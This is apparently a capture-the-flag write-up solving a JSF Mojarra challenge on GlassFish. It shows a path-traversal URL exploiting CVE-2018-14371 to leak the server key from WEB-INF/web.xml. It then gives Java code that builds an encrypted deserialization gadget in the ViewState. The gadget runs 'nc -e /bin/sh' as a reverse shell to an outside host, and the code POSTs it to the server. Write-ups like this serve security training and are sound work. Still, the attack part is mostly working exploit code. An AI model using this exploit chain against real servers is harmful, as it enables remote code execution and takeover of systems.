## In short: ( ./src for code refer)
```
java -jar mojarra_sol.jar localhost 31337 tsug0d.com 4321
```
<img src="https://i.imgur.com/k4AFWOQ.png" width="50%" />

## Explaination:
2 Steps chall: Leak server key + Generate JSF2 ViewState contains gadget that can call TeamBean toString method

#### Step 1: Leak server key

From Response header
```
X-Powered-By: Servlet/3.1 JSP/2.3 (GlassFish Server Open Source Edition  5.0  Java/Oracle Corporation/1.8)
```
-> JSP/2.3 

-> CVE-2018-14371

search for patch

<img src="https://i.imgur.com/hrEfeCs.png" width="50%" />

-> Vulnerable at parameter `loc` of ResourceManager

ResourceManager example:

http://localhost:31337/mojarra_war/javax.faces.resource/bootstrap.min.css.xhtml?loc=css

loc=css means the server will look for the file inside resources/css folder

<img src="https://i.imgur.com/zccSXLl.png" width="50%" />

the key is inside WEB-INF/web.xml, so how to get it?

-> http://localhost:31337/mojarra_war/javax.faces.resource/web.xml.xhtml?loc=../WEB-INF

<img src="https://i.imgur.com/PiFdMV1.png" width="50%" />

#### Step 2: Generate JSF2 ViewState contains gadget that can call TeamBean toString method

<img src="https://i.imgur.com/qVayCoL.png" width="30%" />

1. Create gadget that call TeamBean toString (src/ascisz.java line 31 to 52)

```
        TeamBean team = new TeamBean();
        String payload = "var message = \"tsudepzai\";"+
                String.format("var lhost = \"%s\";",lhost) +
                String.format("var lport = \"%s\";",lport) +
                "p = new java.lang.ProcessBuilder();"+
                "p.command(\"nc\",\"-e\",\"/bin/sh\", lhost, lport);"+
                "p.start();";
        // Set team_secret_status true
        Field team_secret_status = team.getClass().getDeclaredField("team_secret_status");
        team_secret_status.setAccessible(true);
        team_secret_status.set(team, true);

        // Set payload eval
        Field template = team.getClass().getDeclaredField("template");
        template.setAccessible(true);
        template.set(team, payload);

        // gadget BadAttributeValueExpException.readObject() -> TeamBean.toString()
        BadAttributeValueExpException bad = new BadAttributeValueExpException(null);
        Field val = bad.getClass().getDeclaredField("val");
        val.setAccessible(true);
        val.set(bad, team);
```
                                                  
2. Gzip + Enc + Base64 (src/ascisz.java line 55 to 68)
```
        ByteArrayGuard guard = new ByteArrayGuard();
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream outputStream = new ObjectOutputStream(byteArrayOutputStream);
        outputStream.writeObject(bad);
        outputStream.close();

        ByteArrayOutputStream byteArrayOutputStreamGzip = new ByteArrayOutputStream();

        GZIPOutputStream gzipOutputStream = new GZIPOutputStream(byteArrayOutputStreamGzip);
        gzipOutputStream.write(byteArrayOutputStream.toByteArray());
        gzipOutputStream.close();

        byte[] bytes = byteArrayOutputStreamGzip.toByteArray();
        bytes = guard.encrypt(bytes);
```
The original encryption (Enc) code is inside `com.sun.faces.renderkit.ByteArrayGuard`, just copy the code, modify a little bit, insert our key there and run (ByteArrayGuard.java)

3. Send ViewState to server to trigger unserialize (src/ascisz.java line 73 to 84)
```
        String url = String.format("http://%s:%s/mojarra_war/editTeam.xhtml", rhost, rport);
        HttpURLConnection httpClient = (HttpURLConnection) new URL(url).openConnection();
        httpClient.setRequestMethod("POST");

        String urlParameters = "javax.faces.ViewState="+encodeValue(Base64.getEncoder().encodeToString(bytes));

        httpClient.setDoOutput(true);
        try (DataOutputStream wr = new DataOutputStream(httpClient.getOutputStream())) {
            wr.writeBytes(urlParameters);
            wr.flush();
            httpClient.getResponseCode();
        }
```
= End =
